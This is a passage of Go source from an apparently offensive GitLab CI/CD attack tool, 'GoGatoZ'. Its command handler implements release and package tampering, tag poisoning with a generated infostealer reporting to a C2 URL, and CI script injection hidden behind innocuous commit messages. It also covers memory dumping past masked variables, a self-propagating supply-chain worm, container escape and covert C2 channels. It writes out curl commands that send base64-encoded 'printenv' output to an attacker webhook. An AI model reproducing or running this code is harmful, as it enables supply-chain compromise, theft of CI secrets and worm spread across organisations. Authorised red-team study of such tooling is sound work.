				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Harvest complete: %d callbacks, %d credentials", result.Callbacks, len(result.Credentials)))
			for _, c := range result.Credentials {
				valid := "unvalidated"
				if c.IsValid {
					valid = fmt.Sprintf("valid (user: %s)", c.Username)
				}
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  %s (%s) from %s — %s", c.TokenType, c.TokenHash[:12], c.SourceKey, valid))
			}
			return nil
		}

		// tamper-release mode: modify release metadata and/or replace asset links
		if atkTamperRelease {
			tagName := strings.TrimSpace(atkTagName)
			if tagName == "" {
				return fmt.Errorf("--tag-name is required for --tamper-release")
			}
			opts := tamper.TamperReleaseOptions{
				NewName:        strings.TrimSpace(atkReleaseName),
				NewDescription: strings.TrimSpace(atkReleaseDesc),
			}
			if ln := strings.TrimSpace(atkLinkName); ln != "" && strings.TrimSpace(atkLinkURL) != "" {
				opts.ReplaceLinks = map[string]string{ln: strings.TrimSpace(atkLinkURL)}
			}
			if an := strings.TrimSpace(atkAddLinkName); an != "" && strings.TrimSpace(atkAddLinkURL) != "" {
				opts.AddLinks = map[string]string{an: strings.TrimSpace(atkAddLinkURL)}
			}
			replaced, added, err := tamper.TamperRelease(ctx, client, atkTarget, tagName, opts)
			if err != nil {
				return err
			}
			if outputJSON {
				out := struct {
					TagName  string `json:"tag_name"`
					Replaced int    `json:"links_replaced"`
					Added    int    `json:"links_added"`
				}{TagName: tagName, Replaced: replaced, Added: added}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Tampered release %s: %d links replaced, %d added", tagName, replaced, added))
			return nil
		}

		// tamper-package mode: upload malicious package to Generic Packages registry
		if atkTamperPackage {
			pkgName := strings.TrimSpace(atkPackageName)
			pkgVer := strings.TrimSpace(atkPackageVer)
			pkgFile := strings.TrimSpace(atkPackageFile)
			if pkgName == "" || pkgVer == "" || pkgFile == "" {
				return fmt.Errorf("--package-name, --package-version, and --package-file are required for --tamper-package")
			}
			f, err := os.Open(pkgFile)
			if err != nil {
				return fmt.Errorf("open --package-file: %w", err)
			}
			defer f.Close()
			fileName := filepath.Base(pkgFile)
			result, err := tamper.PublishPackage(ctx, client, atkTarget, pkgName, pkgVer, fileName, f)
			if err != nil {
				return err
			}
			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Published %s/%s/%s", result.PackageName, result.PackageVersion, result.FileName))
			if result.URL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("URL: %s", result.URL))
			}
			return nil
		}

		// tamper-tag mode: poison a git tag with modified file tree (Trivy-style supply chain attack)
		if atkTamperTag {
			tagName := strings.TrimSpace(atkTagName)
			if tagName == "" {
				return fmt.Errorf("--tag-name is required for --tamper-tag")
			}

			// Resolve payload content
			payload := strings.TrimSpace(atkTamperTagPayload)
			if payload == "" && strings.TrimSpace(atkTamperTagPayloadFile) != "" {
				b, perr := os.ReadFile(strings.TrimSpace(atkTamperTagPayloadFile))
				if perr != nil {
					return fmt.Errorf("read --tamper-tag-payload-file: %w", perr)
				}
				payload = string(b)
			}

			// If --tamper-tag-preserve-original, fetch original file content
			var originalContent string
			if atkTamperTagOriginal && payload == "" {
				att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
				targetFile := strings.TrimSpace(atkTamperTagFile)
				if targetFile == "" {
					targetFile = "entrypoint.sh"
				}
				orig, ferr := att.GetFileContent(ctx, atkTarget, tagName, targetFile)
				if ferr == nil {
					originalContent = orig
				}
			}

			// If no explicit payload, generate an infostealer
			if payload == "" {
				c2 := strings.TrimSpace(atkTamperTagC2)
				if c2 == "" {
					c2 = strings.TrimSpace(atkWebhook)
				}
				if c2 == "" {
					return fmt.Errorf("--tamper-tag-c2 or --webhook is required when no explicit payload is provided for --tamper-tag")
				}
				var rsaPubKey string
				if f := strings.TrimSpace(atkTamperTagRSAPubFile); f != "" {
					b, rerr := os.ReadFile(f)
					if rerr != nil {
						return fmt.Errorf("read --tamper-tag-rsa-pub: %w", rerr)
					}
					rsaPubKey = string(b)
				}
				payload = payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
					C2URL:           c2,
					EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
					RSAPubKey:       rsaPubKey,
					BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
					OriginalContent: originalContent,
					ProcScan:        atkTamperTagProcScan,
					MemoryDump:      atkTamperTagMemDump,
					Extended:        atkTamperTagExtended,
				})
			} else if atkTamperTagOriginal && originalContent != "" {
				// Explicit payload with --tamper-tag-preserve-original: append original after payload
				payload = payload + "\n# === ORIGINAL SCRIPT CONTENT ===\n" + originalContent
			}

			result, terr := tamper.TamperTag(ctx, client, atkTarget, tamper.TamperTagOptions{
				TagName:        tagName,
				TargetFile:     strings.TrimSpace(atkTamperTagFile),
				PayloadContent: payload,
				SourceRef:      strings.TrimSpace(atkTamperTagSource),
				AuthorName:     atkAuthorName,
				AuthorEmail:    atkAuthorEmail,
			})
			if terr != nil {
				return terr
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Poisoned tag %s: %s -> %s",
				result.TagName, result.OriginalCommitSHA[:12], result.NewCommitSHA[:12]))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Swapped file: %s", result.TargetFile))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned author: %s", result.ClonedAuthor))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned message: %s", strings.SplitN(result.ClonedMessage, "\n", 2)[0]))
			return nil
		}

		// inject-script mode: modify repo scripts called by CI (workflow hopping)
		if atkInjectScript {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}

			// Resolve payload content
			payload := strings.TrimSpace(atkScriptPayload)
			if payload == "" && strings.TrimSpace(atkScriptPayloadFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkScriptPayloadFile))
				if err != nil {
					return fmt.Errorf("read --script-payload-file: %w", err)
				}
				payload = string(b)
			}
			if payload == "" {
				return fmt.Errorf("--script-payload or --script-payload-file is required for --inject-script")
			}

			// Branch handling
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}

			// Fetch the project to determine the default branch for CI config detection
			var defaultBranch string
			p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
			if perr == nil && p != nil {
				defaultBranch = p.DefaultBranch
			}
			if defaultBranch == "" {
				defaultBranch = "main"
			}

			// Determine target script path
			scriptPath := strings.TrimSpace(atkScriptPath)
			if scriptPath == "" {
				// Auto-detect: fetch CI config from the default branch and extract script references
				content, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, ".gitlab-ci.yml")
				if ferr != nil {
					return fmt.Errorf("fetch .gitlab-ci.yml for script detection: %w", ferr)
				}
				doc, perr := pipeline.Parse(strings.NewReader(content))
				if perr != nil {
					return fmt.Errorf("parse .gitlab-ci.yml: %w", perr)
				}
				refs := scriptinject.ExtractScriptRefs(doc)
				if len(refs) == 0 {
					return fmt.Errorf("no external script references found in .gitlab-ci.yml; use --script-path to specify manually")
				}
				scriptPath = refs[0].Path
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
			}

			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}

			// Fetch original file content from the default branch
			original, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, scriptPath)
			if ferr != nil {
				return fmt.Errorf("fetch %s from %s: %w", scriptPath, defaultBranch, ferr)
			}

			// Inject payload
			var modified string
			if atkScriptPrepend {
				modified = scriptinject.PrependPayload(original, payload)
			} else {
				modified = scriptinject.AppendPayload(original, payload)
			}

			// Commit modified script
			msg := strings.TrimSpace(atkMessage)
			if msg == "" {
				msg = fmt.Sprintf("chore: update %s", scriptPath)
			}
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, scriptPath, modified, msg); err != nil {
				return fmt.Errorf("commit modified script: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] injected payload into %s on branch %s\n", scriptPath, finalBranch)

			// Optionally trigger pipeline
			var pipelineID int64
			var pipelineURL string
			if atkTriggerPipeline {
				pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
				if err != nil {
					return fmt.Errorf("trigger pipeline: %w", err)
				}
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
			}

			if outputJSON {
				out := struct {
					Branch      string `json:"branch"`
					ScriptPath  string `json:"script_path"`
					PipelineURL string `json:"pipeline_url,omitempty"`
					PipelineID  int64  `json:"pipeline_id,omitempty"`
				}{
					Branch:      finalBranch,
					ScriptPath:  scriptPath,
					PipelineURL: pipelineURL,
					PipelineID:  pipelineID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected payload into %s (branch %s)", scriptPath, finalBranch))
			if pipelineURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
			}
			return nil
		}

		// LOTP injection mode: weaponize tool config files (binding.gyp, Makefile, etc.)
		if atkLOTPInject {
			if strings.TrimSpace(atkLOTPTool) == "" {
				return fmt.Errorf("--lotp-tool is required for --lotp-inject (e.g., npm-gyp, make, pytest, goreleaser, gradle, terraform)")
			}
			if strings.TrimSpace(atkCmd) == "" {
				return fmt.Errorf("--cmd is required for --lotp-inject")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			la := attack.NewLOTPAttack(att)
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			result, err := la.InjectLOTPPayload(ctx, atkTarget, finalBranch, atkLOTPTool, atkCmd)
			if err != nil {
				return fmt.Errorf("LOTP inject: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] LOTP payload committed to branch %s (%d files)\n", finalBranch, len(result.FilesCommitted))

			var pipelineID int64
			var pipelineURL string
			if atkTriggerPipeline {
				pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
				if err != nil {
					return fmt.Errorf("trigger pipeline: %w", err)
				}
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
			}

			if outputJSON {
				out := struct {
					Branch         string   `json:"branch"`
					Tool           string   `json:"tool"`
					FilesCommitted []string `json:"files_committed"`
					Description    string   `json:"description"`
					Reference      string   `json:"reference"`
					PipelineURL    string   `json:"pipeline_url,omitempty"`
					PipelineID     int64    `json:"pipeline_id,omitempty"`
				}{
					Branch:         result.Branch,
					Tool:           result.Tool,
					FilesCommitted: result.FilesCommitted,
					Description:    result.Description,
					Reference:      result.Reference,
					PipelineURL:    pipelineURL,
					PipelineID:     pipelineID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("LOTP payload injected (tool=%s branch=%s files=%v)", result.Tool, finalBranch, result.FilesCommitted))
			renderInfo(cmd.OutOrStdout(), result.Description)
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Reference: %s", result.Reference))
			if pipelineURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
			}
			return nil
		}

		// ror-shell listener mode: start a callback server, commit ror-shell payload, wait for exfil
		if atkRorListen {
			// ror-listen is always ror-shell payload
			atkPayload = "ror-shell"
			if strings.TrimSpace(atkTarget) == "" {
				return fmt.Errorf("--ror-listen requires --target")
			}
			if strings.TrimSpace(atkWebhook) == "" {
				return fmt.Errorf("--webhook is required for --ror-listen (external URL reachable from runners)")
			}

			// Start the listener
			listenAddr := strings.TrimSpace(atkRorListenAddr)
			if listenAddr == "" {
				listenAddr = "127.0.0.1:9444"
			}
			listenTimeout, terr := time.ParseDuration(strings.TrimSpace(atkRorListenTimeout))
			if terr != nil || listenTimeout <= 0 {
				listenTimeout = 10 * time.Minute
			}

			listener := newRorShellListener(listenAddr, cmd.OutOrStdout())
			listenErrCh := make(chan error, 1)
			go func() {
				listenErrCh <- listener.Run(ctx)
			}()

			// Wait for the listener to be ready or fail
			select {
			case <-listener.Ready():
				// bound successfully
			case err := <-listenErrCh:
				return fmt.Errorf("ror-listener failed to start: %w", err)
			case <-time.After(5 * time.Second):
				return fmt.Errorf("ror-listener startup timeout")
			}
			actualAddr := listener.Addr()

			// Build the ror-shell webhook URL (reachable from runners)
			webhookURL := strings.TrimSpace(atkWebhook)
			if webhookURL == "" {
				webhookURL = fmt.Sprintf("http://%s/callback", strings.TrimPrefix(actualAddr, "["))
			}

			// Build the ror-shell command that sends env dump to the webhook
			rorCmd := strings.TrimSpace(atkCmd)
			if rorCmd == "" {
				// Default: execute a basic command AND send results to the listener
				rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s/callback" || true`, webhookURL)
			} else {
				// User provided a custom cmd: also send it to the listener
				rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s/callback" || true`, rorCmd, webhookURL)
			}

			// Override atkWebhook so renderPayload picks it up
			savedWebhook := atkWebhook
			atkWebhook = webhookURL
			// Override atkCmd so renderPayload uses the right command
			savedCmd := atkCmd
			atkCmd = rorCmd
			// Also set default tags for ror-listen so the job can be scheduled
			savedTags := atkTags
			if strings.TrimSpace(atkTags) == "" {
				atkTags = "shell_executor"
			}

			// Re-render the payload with our webhook
			yaml, err := renderPayload()
			if err != nil {
				_ = listener.Stop(ctx)
				return fmt.Errorf("render ror-shell payload: %w", err)
			}

			// Restore saved values
			atkWebhook = savedWebhook
			atkCmd = savedCmd
			atkTags = savedTags

			// Proceed with the commit-ci flow
			atkCommitCI = true
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-ror-listen"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				_ = listener.Stop(ctx)
				return berr
			}
			att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pipelineURL, cerr := att.CommitCIPipeline(ctx, atkTarget, finalBranch, yaml, "Execute runner command via GoGatoZ")
			if cerr != nil {
				_ = listener.Stop(ctx)
				return fmt.Errorf("commit ror-shell payload: %w", cerr)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] pipeline: %s\n", pipelineURL)
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline committed: %s", pipelineURL))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Listener active on %s", actualAddr))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for exfiltrated data (timeout: %s)...", listenTimeout))

			// Wait for callbacks
			results, werr := listener.WaitFor(ctx, listenTimeout)
			if werr != nil {
				fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] wait: %v\n", werr)
			}

			// Display results
			if len(results) > 0 {
				renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s)", len(results)))
				for i, r := range results {
					if i > 0 {
						fmt.Fprintln(cmd.OutOrStdout())
					}
					source := r.Addr
					if r.Project != "" {
						source = r.Project + " (" + r.Addr + ")"
					}
					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, source, len(r.Secrets)))
					renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
				}
				// Save to DB
				pipelineID, _ := parsePipelineURL(pipelineURL)
				persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, pipelineURL, finalBranch, pipelineURL, pipelineID, 0, resultsToMap(results))
			} else {
				renderWarning(cmd.OutOrStdout(), "No data received within timeout — make sure the runner executed the command and sent data to the webhook")
			}

			// Shutdown listener
			_ = listener.Stop(ctx)
			return nil
		}

		// memory-dump mode: inject a CI job that dumps secrets from runner process memory
		// (bypasses GitLab masked variables by reading /proc/<pid>/mem or /proc/*/environ)
		if atkMemoryDump {
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-memory-dump"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "ci: fix variable resolution"
			}
			c2URL := strings.TrimSpace(atkWebhook)
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for t := range strings.SplitSeq(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			payload := payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    tags,
					Manual:  atkManual,
				},
				CallbackURL:   c2URL,
				EncryptionKey: strings.TrimSpace(atkTamperTagEncKey),
				ProcScan:      true,
				MemoryDump:    true,
				Extended:      true,
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", payload, atkMessage); err != nil {
				return fmt.Errorf("commit memory dump payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed memory dump payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch  string `json:"branch"`
					HasDump bool   `json:"memory_dump"`
					HasScan bool   `json:"proc_scan"`
				}{
					Branch:  finalBranch,
					HasDump: true,
					HasScan: true,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Memory dump payload committed to branch %s", finalBranch))
			renderInfo(cmd.OutOrStdout(), "This payload will attempt to extract secrets from runner process memory")
			return nil
		}

		// supply-chain-worm mode: self-propagating CI injection across sibling repos
		if atkSupplyChainWorm {
			maxRepos := atkWormMaxRepos
			if maxRepos <= 0 {
				maxRepos = 5
			}
			// Get the project to find its group
			p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
			if perr != nil {
				return fmt.Errorf("get project: %w", perr)
			}
			groupPath := ""
			if p.Namespace != nil {
				groupPath = p.Namespace.FullPath
			}
			if groupPath == "" {
				groupPath = strings.TrimSpace(atkWormTargetGroup)
			}
			if groupPath == "" {
				return fmt.Errorf("--worm-target-group is required when the target project has no group namespace")
			}

			// When --webhook is set, start a listener and inject callback exfil into the worm payload
			webhookURL := strings.TrimSpace(atkWebhook)
			var listener *Listener
			if webhookURL != "" {
				// Extract port from webhook URL for the listener
				listenAddr := ":9445"
				if u, uerr := url.Parse(webhookURL); uerr == nil && u.Port() != "" {
					listenAddr = ":" + u.Port()
				}
				listener = NewListener(listenAddr, cmd.ErrOrStderr())
				listenErrCh := make(chan error, 1)
				go func() { listenErrCh <- listener.Run(ctx) }()
				select {
				case <-listener.Ready():
				case err := <-listenErrCh:
					return fmt.Errorf("worm listener failed to start: %w", err)
				case <-time.After(5 * time.Second):
					return fmt.Errorf("worm listener startup timeout")
				}
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Worm listener active on %s", listener.Addr()))
			}

			wormPayload := strings.TrimSpace(atkWormPayload)
			if wormPayload == "" && webhookURL != "" {
				// Auto-generate callback exfil payload
				wormPayload = fmt.Sprintf(
					`curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(printenv | base64 -w0)\"}" "%s/exfil" || true`,
					webhookURL)
			} else if wormPayload == "" {
				wormPayload = "printenv | sort"
			}

			result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
			if outputJSON && listener == nil {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Supply chain worm propagated to %d repos", result.Promoted))
			if result.Failed > 0 {
				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d repos failed to inject", result.Failed))
			}

			// Wait for callbacks from infected repos
			if listener != nil && result.Promoted > 0 {
				listenTimeout := 3 * time.Minute
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for %d callback(s) (timeout: %s)...", result.Promoted, listenTimeout))
				results, werr := listener.WaitFor(ctx, listenTimeout)
				_ = listener.Stop(ctx)
				if werr != nil {
					renderWarning(cmd.OutOrStdout(), fmt.Sprintf("listener: %v", werr))
				}
				if len(results) > 0 {
					renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s) from infected repos", len(results)))
					for i, r := range results {
						if i > 0 {
							fmt.Fprintln(cmd.OutOrStdout())
						}
						source := r.Addr
						if r.Project != "" {
							source = r.Project
						}
						renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — %s (%d secrets)", i+1, source, len(r.Secrets)))
						renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
					}
					// Persist to DB
					allSecrets := make(map[string]string)
					for _, r := range results {
						prefix := ""
						if r.Project != "" {
							prefix = r.Project + "/"
						}
						for k, v := range r.Secrets {
							allSecrets[prefix+k] = v
						}
					}
					persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, "", 0, 0, allSecrets)
				} else {
					renderWarning(cmd.OutOrStdout(), "No callbacks received — pipelines may still be queued")
				}
			} else if listener != nil {
				_ = listener.Stop(ctx)
			}
			return nil
		}

		// container-escape mode: exploit privileged Docker executor to escape to host
		if atkContainerEscape {
			escapeMethod := strings.ToLower(strings.TrimSpace(atkEscapeMethod))
			if escapeMethod == "" {
				escapeMethod = "docker"
			}
			escapeCmd := strings.TrimSpace(atkEscapeCommand)
			if escapeCmd == "" {
				escapeCmd = "bash"
			}
			mountPath := strings.TrimSpace(atkEscapeMountPath)
			if mountPath == "" {
				mountPath = "/"
			}
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-container-escape"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "build: optimize container runtime"
			}
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for t := range strings.SplitSeq(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			if len(tags) == 0 {
				tags = []string{"docker"}
			}
			ceImage := strings.TrimSpace(atkImage)
			if ceImage == "" {
				ceImage = "docker:dind"
			}
			yaml := payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
				Common: payloadgen.CommonOptions{
					JobName:         strings.TrimSpace(atkJobName),
					Stage:           strings.TrimSpace(atkStage),
					Image:           ceImage,
					Tags:            tags,
					Manual:          atkManual,
					ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
					ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
				},
				ExfilMethod:  strings.TrimSpace(atkExfilMethod),
				ExfilTarget:  strings.TrimSpace(atkExfilTarget),
				EscapeMethod: escapeMethod,
				EscapeCmd:    escapeCmd,
				MountPath:    mountPath,
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
				return fmt.Errorf("commit container escape payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed container escape payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch       string `json:"branch"`
					EscMethod    string `json:"escape_method"`
					DockerInDind bool   `json:"docker_in_dind"`
				}{
					Branch:       finalBranch,
					EscMethod:    escapeMethod,
					DockerInDind: true,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Container escape payload committed to branch %s", finalBranch))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Method: %s with command: %s", escapeMethod, escapeCmd))
			renderInfo(cmd.OutOrStdout(), "This job will attempt to escape the container to the host system")
			return nil
		}

		// variable-inject mode: inject malicious CI variables into project/group scope
		if atkVariableInject {
			if strings.TrimSpace(atkInjectVars) == "" {
				return fmt.Errorf("--inject-vars is required (JSON: '[{\"key\":\"MY_SECRET\",\"value\":\"val\"}]')")
			}
			scope := strings.ToLower(strings.TrimSpace(atkInjectScope))
			if scope == "" {
				scope = "project"
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			type injectVar struct {
				Key         string `json:"key"`
				Value       string `json:"value"`
				Protected   bool   `json:"protected"`
				Masked      bool   `json:"masked"`
				Environment string `json:"environment_scope"`
			}
			var vars []injectVar
			if err := json.Unmarshal([]byte(atkInjectVars), &vars); err != nil {
				return fmt.Errorf("parse --inject-vars JSON: %w", err)
			}
			for i := range vars {
				if atkInjectProtected {
					vars[i].Protected = true
				}
				if atkInjectMasked {
					vars[i].Masked = true
				}
			}
			results := make([]struct {
				Key     string `json:"key"`
				Scope   string `json:"scope"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			}, 0)
			for _, v := range vars {
				if v.Key == "" {
					continue
				}
				if scope == "group" {
					gid := strings.TrimSpace(atkInjectGroupID)
					if gid == "" {
						results = append(results, struct {
							Key     string `json:"key"`
							Scope   string `json:"scope"`
							Success bool   `json:"success"`
							Error   string `json:"error,omitempty"`
						}{Key: v.Key, Scope: scope, Success: false, Error: "--group-id required for group-scope injection"})
						continue
					}
					_, _, err := att.SetGroupVariable(ctx, gid, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
					results = append(results, struct {
						Key     string `json:"key"`
						Scope   string `json:"scope"`
						Success bool   `json:"success"`
						Error   string `json:"error,omitempty"`
					}{Key: v.Key, Scope: scope + ":" + gid, Success: err == nil, Error: ifErr(err)})
				} else {
					_, _, err := att.SetProjectVariable(ctx, atkTarget, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
					results = append(results, struct {
						Key     string `json:"key"`
						Scope   string `json:"scope"`
						Success bool   `json:"success"`
						Error   string `json:"error,omitempty"`
					}{Key: v.Key, Scope: scope, Success: err == nil, Error: ifErr(err)})
				}
			}
			if outputJSON {
				b, _ := json.MarshalIndent(struct {
					Scope    string `json:"scope"`
					Injected []struct {
						Key     string `json:"key"`
						Scope   string `json:"scope"`
						Success bool   `json:"success"`
						Error   string `json:"error,omitempty"`
					} `json:"injected"`
				}{
					Scope: scope,
					Injected: func() []struct {
						Key     string `json:"key"`
						Scope   string `json:"scope"`
						Success bool   `json:"success"`
						Error   string `json:"error,omitempty"`
					} {
						out := make([]struct {
							Key     string `json:"key"`
							Scope   string `json:"scope"`
							Success bool   `json:"success"`
							Error   string `json:"error,omitempty"`
						}, len(results))
						copy(out, results)
						return out
					}(),
				}, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected %d variables into %s scope", len(results), scope))
			for _, r := range results {
				if r.Success {
					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  ✓ %s (%s)", r.Key, r.Scope))
				} else {
					renderError(cmd.OutOrStdout(), fmt.Sprintf("  ✗ %s: %s", r.Key, r.Error))
				}
			}
			return nil
		}

		// c2-channel mode: establish a covert C2 channel via DNS tunnel, steganography, etc.
		if atkC2Channel {
			method := strings.ToLower(strings.TrimSpace(atkC2Method))
			if method == "" {
				method = "dns-a"
			}
